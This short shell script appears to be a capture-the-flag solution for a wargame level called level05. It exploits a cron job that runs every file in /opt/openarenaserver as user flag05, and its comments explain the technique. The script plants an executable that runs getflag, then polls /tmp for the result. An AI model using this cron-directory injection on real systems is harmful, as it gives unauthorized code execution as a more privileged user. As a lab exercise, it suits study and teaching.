#!/bin/sh
# There is a file called /var/mail/level05 that contains
# */2 * * * * su -c "sh /usr/sbin/ penarenaserver" - flag05
# which is a cronjob.
# */2 : runs every 2 minutes.

# The executable that runs contains

#for i in /opt/openarenaserver/* ; do
        #(ulimit -t 5; bash -x "$i")
        #rm -f "$i"
#done

# So all we have to do is put a file that is executable by
# flag05 inside the /opt/openarenaserver directory
# that calls getflag and redirects the output to a file in
# the /tmp directory and then cat it to get the flag.

echo 'getflag > /tmp/flag05' > /opt/openarenaserver/flag
chmod 777 /opt/openarenaserver/flag
# wait for the cronjob to run
while [ ! -e /tmp/flag05 ]
do
	sleep 1
done
cat /tmp/flag05
